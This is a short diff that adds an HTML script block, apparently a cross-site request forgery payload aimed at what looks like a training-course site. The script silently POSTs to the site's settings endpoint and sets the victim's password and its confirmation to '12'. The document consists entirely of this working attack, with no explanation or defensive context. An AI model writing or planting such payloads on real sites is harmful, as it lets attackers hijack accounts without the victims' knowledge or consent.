@@ -1,0 +1,8 @@
+<script>
+        fetch('http://cats.is-course.ru/settings', {method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: 'password=12&confirm-password=12'
+        });
+</script>
